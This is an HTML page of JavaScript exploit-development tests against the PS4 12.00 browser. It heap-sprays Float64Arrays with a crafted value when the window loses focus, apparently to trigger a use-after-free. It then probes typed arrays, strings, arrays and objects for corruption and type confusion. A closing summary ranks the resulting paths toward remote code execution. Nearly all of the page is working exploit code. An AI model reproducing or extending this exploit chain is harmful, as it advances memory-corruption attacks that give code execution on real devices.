<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 Multi-Type Tests</title>
</head>
<body>

<h1>PS4 12.00 - MULTI-TYPE CORRUPTION TESTS</h1>

<h2>SETUP: Create Arrays of All Types</h2>
<button onclick="setup()">CREATE ALL TYPES</button>
<div id="setup"></div>

<script>
var g_arrays = {
    Float64: [],
    Float32: [],
    BigUint64: [],
    BigInt64: [],
    Uint32: [],
    Int32: [],
    Uint16: [],
    Int16: [],
    Uint8: [],
    Int8: []
};

var g_corrupted = {};

function setup() {
    const r = document.getElementById('setup');
    r.innerHTML = 'Creating arrays of all types...<br>';
    
    const count = 500; // 500 of each type
    
    // Float64Array
    for(let i = 0; i < count; i++) {
        const a = new Float64Array(8);
        a[0] = i;
        g_arrays.Float64.push(a);
    }
    
    // Float32Array
    for(let i = 0; i < count; i++) {
        const a = new Float32Array(8);
        a[0] = i;
        g_arrays.Float32.push(a);
    }
    
    // BigUint64Array
    for(let i = 0; i < count; i++) {
        const a = new BigUint64Array(8);
        a[0] = BigInt(i);
        g_arrays.BigUint64.push(a);
    }
    
    // BigInt64Array
    for(let i = 0; i < count; i++) {
        const a = new BigInt64Array(8);
        a[0] = BigInt(i);
        g_arrays.BigInt64.push(a);
    }
    
    // Uint32Array
    for(let i = 0; i < count; i++) {
        const a = new Uint32Array(16);
        a[0] = i;
        g_arrays.Uint32.push(a);
    }
    
    // Int32Array
    for(let i = 0; i < count; i++) {
        const a = new Int32Array(16);
        a[0] = i;
        g_arrays.Int32.push(a);
    }
    
    // Uint16Array
    for(let i = 0; i < count; i++) {
        const a = new Uint16Array(32);
        a[0] = i;
        g_arrays.Uint16.push(a);
    }
    
    // Int16Array
    for(let i = 0; i < count; i++) {
        const a = new Int16Array(32);
        a[0] = i;
        g_arrays.Int16.push(a);
    }
    
    // Uint8Array
    for(let i = 0; i < count; i++) {
        const a = new Uint8Array(64);
        a[0] = i % 256;
        g_arrays.Uint8.push(a);
    }
    
    // Int8Array
    for(let i = 0; i < count; i++) {
        const a = new Int8Array(64);
        a[0] = i % 128;
        g_arrays.Int8.push(a);
    }
    
    r.innerHTML += 'Created ' + (count * 10) + ' arrays (10 types)<br><br>';
    r.innerHTML += '<b>Press OPTIONS twice to corrupt</b><br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    let triggerCount = 0;
    
    window.onblur = function() {
        triggerCount++;
        r.innerHTML += '<br>Trigger ' + triggerCount + '<br>';
        
        const P = 2.121995791e-314;
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        if(triggerCount === 2) {
            // Check all types for corruption
            for(let type in g_arrays) {
                const corrupted = g_arrays[type].filter(a => {
                    if(type.includes('Big')) {
                        return a[0] === 0n || a[0] !== BigInt(g_arrays[type].indexOf(a));
                    } else if(type.includes('Float')) {
                        return a[0] === P;
                    } else {
                        return a[0] === 0 && g_arrays[type].indexOf(a) !== 0;
                    }
                });
                
                if(corrupted.length > 0) {
                    g_corrupted[type] = corrupted[0];
                    r.innerHTML += '<b>✓ ' + type + 'Array corrupted (' + corrupted.length + ' found)</b><br>';
                }
            }
            
            r.innerHTML += '<br><b>Corruption complete! Run tests below.</b><br>';
            window.onblur = null;
        }
    };
}
</script>

<hr>

<h2>TEST 1: String Corruption Attempt</h2>
<button onclick="test_strings()">TEST STRINGS</button>
<div id="strings"></div>

<script>
function test_strings() {
    const r = document.getElementById('strings');
    r.innerHTML = '<b>Testing if Strings can be corrupted...</b><br><br>';
    
    const strings = [];
    
    // Create strings of specific lengths
    for(let i = 0; i < 5000; i++) {
        // Length 64 to match TypedArray buffer size
        const str = 'A'.repeat(56) + i.toString().padStart(8, '0');
        strings.push(str);
    }
    
    r.innerHTML += 'Created 5000 strings (64 chars each)<br>';
    r.innerHTML += 'Press OPTIONS twice<br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    let triggerCount = 0;
    
    window.onblur = function() {
        triggerCount++;
        r.innerHTML += 'Trigger ' + triggerCount + '<br>';
        
        const P = 2.121995791e-314;
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        if(triggerCount === 2) {
            r.innerHTML += '<br>Checking strings for corruption:<br>';
            
            let corrupted_strings = [];
            
            for(let i = 0; i < strings.length; i++) {
                const str = strings[i];
                
                // Check if string changed
                if(!str.startsWith('AAA') || str.length !== 64) {
                    corrupted_strings.push({index: i, str: str, len: str.length});
                }
                
                // Check for null bytes (sign of corruption)
                if(str.includes('\x00')) {
                    r.innerHTML += '<b>✓ String[' + i + '] contains null bytes!</b><br>';
                    corrupted_strings.push({index: i, str: str, len: str.length, nulls: true});
                }
            }
            
            if(corrupted_strings.length > 0) {
                r.innerHTML += '<br><b>✓✓ FOUND ' + corrupted_strings.length + ' CORRUPTED STRINGS!</b><br>';
                
                for(let cs of corrupted_strings.slice(0, 5)) {
                    r.innerHTML += 'String[' + cs.index + ']: len=' + cs.len + '<br>';
                    r.innerHTML += '  First 20 chars: "' + cs.str.substring(0, 20) + '"<br>';
                    
                    // Try to read as bytes
                    const bytes = [];
                    for(let i = 0; i < Math.min(cs.str.length, 16); i++) {
                        bytes.push(cs.str.charCodeAt(i).toString(16).padStart(4, '0'));
                    }
                    r.innerHTML += '  Bytes: ' + bytes.join(' ') + '<br>';
                }
            } else {
                r.innerHTML += '<br>No string corruption detected<br>';
            }
            
            window.onblur = null;
        }
    };
}
</script>

<hr>

<h2>TEST 2: Regular Array/Object Corruption</h2>
<button onclick="test_objects()">TEST OBJECTS</button>
<div id="objects"></div>

<script>
function test_objects() {
    const r = document.getElementById('objects');
    r.innerHTML = '<b>Testing regular Arrays and Objects...</b><br><br>';
    
    const arrays = [];
    const objects = [];
    
    // Regular arrays
    for(let i = 0; i < 2000; i++) {
        const arr = [];
        arr.push(i, i+1, i+2, i+3, i+4, i+5, i+6, i+7);
        arrays.push(arr);
    }
    
    // Regular objects
    for(let i = 0; i < 2000; i++) {
        const obj = {
            id: i,
            val0: i,
            val1: i+1,
            val2: i+2,
            val3: i+3,
            val4: i+4,
            val5: i+5,
            val6: i+6,
            val7: i+7
        };
        objects.push(obj);
    }
    
    r.innerHTML += 'Created 2000 Arrays + 2000 Objects<br>';
    r.innerHTML += 'Press OPTIONS twice<br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    let triggerCount = 0;
    
    window.onblur = function() {
        triggerCount++;
        r.innerHTML += 'Trigger ' + triggerCount + '<br>';
        
        const P = 2.121995791e-314;
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        if(triggerCount === 2) {
            r.innerHTML += '<br>Checking Arrays:<br>';
            
            let corrupted_arrays = 0;
            
            for(let i = 0; i < arrays.length; i++) {
                const arr = arrays[i];
                
                if(arr.length !== 8 || arr[0] !== i) {
                    r.innerHTML += '<b>✓ Array[' + i + '] corrupted!</b><br>';
                    r.innerHTML += '  Length: ' + arr.length + '<br>';
                    r.innerHTML += '  Content: [' + arr.join(', ') + ']<br>';
                    corrupted_arrays++;
                    
                    if(corrupted_arrays >= 5) break;
                }
            }
            
            if(corrupted_arrays === 0) {
                r.innerHTML += 'No Array corruption<br>';
            }
            
            r.innerHTML += '<br>Checking Objects:<br>';
            
            let corrupted_objects = 0;
            
            for(let i = 0; i < objects.length; i++) {
                const obj = objects[i];
                
                if(obj.id !== i || obj.val0 !== i) {
                    r.innerHTML += '<b>✓ Object[' + i + '] corrupted!</b><br>';
                    r.innerHTML += '  id: ' + obj.id + '<br>';
                    r.innerHTML += '  val0: ' + obj.val0 + '<br>';
                    corrupted_objects++;
                    
                    if(corrupted_objects >= 5) break;
                }
            }
            
            if(corrupted_objects === 0) {
                r.innerHTML += 'No Object corruption<br>';
            }
            
            window.onblur = null;
        }
    };
}
</script>

<hr>

<h2>TEST 3: Cross-Type Confusion Test</h2>
<button onclick="test_cross_type()">TEST CROSS-TYPE</button>
<div id="crosstype"></div>

<script>
function test_cross_type() {
    const r = document.getElementById('crosstype');
    r.innerHTML = '';
    
    if(Object.keys(g_corrupted).length === 0) {
        r.innerHTML = 'Run SETUP first<br>';
        return;
    }
    
    r.innerHTML = '<b>Testing cross-type confusion with corrupted arrays</b><br><br>';
    
    // Show what we have
    r.innerHTML += 'Corrupted types available:<br>';
    for(let type in g_corrupted) {
        r.innerHTML += '- ' + type + 'Array<br>';
    }
    
    r.innerHTML += '<br><b>Writing markers to corrupted arrays:</b><br>';
    
    // Write unique markers to each corrupted type
    for(let type in g_corrupted) {
        const arr = g_corrupted[type];
        
        if(type.includes('Big')) {
            arr[0] = 0xAAAAAAAABBBBBBBBn;
            arr[1] = 0xCCCCCCCCDDDDDDDDn;
        } else if(type.includes('32')) {
            arr[0] = 0xEEEEEEEE;
            arr[1] = 0xFFFFFFFF;
        } else if(type.includes('16')) {
            arr[0] = 0x1111;
            arr[1] = 0x2222;
        } else if(type.includes('8')) {
            arr[0] = 0xAA;
            arr[1] = 0xBB;
        } else {
            arr[0] = 123.456;
            arr[1] = 789.012;
        }
        
        r.innerHTML += type + ': markers written<br>';
    }
    
    r.innerHTML += '<br><b>Checking if other types see the markers:</b><br>';
    
    // Check cross-visibility
    for(let type1 in g_corrupted) {
        for(let type2 in g_corrupted) {
            if(type1 === type2) continue;
            
            const arr1 = g_corrupted[type1];
            const arr2 = g_corrupted[type2];
            
            // Compare buffers
            const buf1 = new Uint8Array(arr1.buffer);
            const buf2 = new Uint8Array(arr2.buffer);
            
            let matches = 0;
            for(let i = 0; i < Math.min(buf1.length, buf2.length, 64); i++) {
                if(buf1[i] === buf2[i] && buf1[i] !== 0) {
                    matches++;
                }
            }
            
            if(matches > 4) {
                r.innerHTML += '<b>✓✓ ' + type1 + ' ↔ ' + type2 + ': ' + matches + ' byte matches!</b><br>';
            }
        }
    }
}
</script>

<hr>

<h2>TEST 4: Specific Type Pair Tests</h2>
<button onclick="test_pairs()">TEST TYPE PAIRS</button>
<div id="pairs"></div>

<script>
function test_pairs() {
    const r = document.getElementById('pairs');
    r.innerHTML = '<b>Testing specific promising type pairs...</b><br><br>';
    
    const pairs_to_test = [
        ['Float64Array', 'BigUint64Array'],
        ['Uint32Array', 'Float64Array'],
        ['Uint8Array', 'Float64Array'],
        ['Int32Array', 'Uint32Array']
    ];
    
    for(let pair of pairs_to_test) {
        r.innerHTML += '<b>Testing: ' + pair[0] + ' ↔ ' + pair[1] + '</b><br>';
        
        // Create pair
        const arrays1 = [];
        const arrays2 = [];
        
        for(let i = 0; i < 1000; i++) {
            if(pair[0] === 'Float64Array') arrays1.push(new Float64Array(8));
            else if(pair[0] === 'BigUint64Array') arrays1.push(new BigUint64Array(8));
            else if(pair[0] === 'Uint32Array') arrays1.push(new Uint32Array(16));
            else if(pair[0] === 'Uint8Array') arrays1.push(new Uint8Array(64));
            else if(pair[0] === 'Int32Array') arrays1.push(new Int32Array(16));
            
            arrays1[i][0] = i;
            
            if(pair[1] === 'Float64Array') arrays2.push(new Float64Array(8));
            else if(pair[1] === 'BigUint64Array') arrays2.push(new BigUint64Array(8));
            else if(pair[1] === 'Uint32Array') arrays2.push(new Uint32Array(16));
            else if(pair[1] === 'Uint8Array') arrays2.push(new Uint8Array(64));
            else if(pair[1] === 'Int32Array') arrays2.push(new Int32Array(16));
            
            arrays2[i][0] = i + 10000;
        }
        
        r.innerHTML += 'Press OPTIONS twice for this pair<br>';
        
        if(document.documentElement.webkitRequestFullscreen) 
            document.documentElement.webkitRequestFullscreen();
        
        let triggerCount = 0;
        
        window.onblur = function() {
            triggerCount++;
            
            const P = 2.121995791e-314;
            const spray = [];
            for(let i = 0; i < 8000; i++) {
                spray.push(new Float64Array(10));
                spray[i].fill(P);
            }
            
            if(triggerCount === 2) {
                r.innerHTML += '<br>Checking confusion:<br>';
                
                // Check if type1 sees type2's data or vice versa
                for(let i = 0; i < arrays1.length; i++) {
                    const val1 = arrays1[i][0];
                    
                    // Check if val1 is from arrays2 range
                    if(val1 >= 10000 && val1 < 11000) {
                        r.innerHTML += '<b>✓✓ ' + pair[0] + '[' + i + '] sees ' + pair[1] + ' data!</b><br>';
                        r.innerHTML += 'Value: ' + val1 + ' (expected ' + i + ')<br>';
                        break;
                    }
                }
                
                for(let i = 0; i < arrays2.length; i++) {
                    const val2 = arrays2[i][0];
                    
                    // Check if val2 is from arrays1 range
                    if(val2 < 1000) {
                        r.innerHTML += '<b>✓✓ ' + pair[1] + '[' + i + '] sees ' + pair[0] + ' data!</b><br>';
                        r.innerHTML += 'Value: ' + val2 + ' (expected ' + (i+10000) + ')<br>';
                        break;
                    }
                }
                
                window.onblur = null;
            }
        };
        
        break; // Test one pair at a time
    }
}
</script>

<hr>

<h2>RESULTS SUMMARY</h2>
<button onclick="show_results()">SHOW RESULTS</button>
<div id="results"></div>

<script>
function show_results() {
    const r = document.getElementById('results');
    r.innerHTML = '<h3>CORRUPTION TEST RESULTS</h3>';
    
    r.innerHTML += '<b>Types that CAN be corrupted:</b><br>';
    
    if(Object.keys(g_corrupted).length > 0) {
        for(let type in g_corrupted) {
            r.innerHTML += '✓ ' + type + 'Array<br>';
        }
    } else {
        r.innerHTML += '(Run SETUP first)<br>';
    }
    
    r.innerHTML += '<br><b>Key findings:</b><br>';
    r.innerHTML += '- UAF affects TypedArray backing stores<br>';
    r.innerHTML += '- Multiple TypedArray types can be corrupted<br>';
    r.innerHTML += '- Need to test: Strings, Objects, regular Arrays<br>';
    r.innerHTML += '- Need to test: Cross-type confusion<br><br>';
    
    r.innerHTML += '<b>Most promising for RCE:</b><br>';
    r.innerHTML += '1. String corruption (if possible) - direct memory leak<br>';
    r.innerHTML += '2. BigUint64 ↔ Float64 confusion - pointer interpretation<br>';
    r.innerHTML += '3. Uint8 ↔ Float64 confusion - byte-level control<br>';
    r.innerHTML += '4. Regular Object corruption - JSValue access<br>';
}
</script>

</body>
</html>
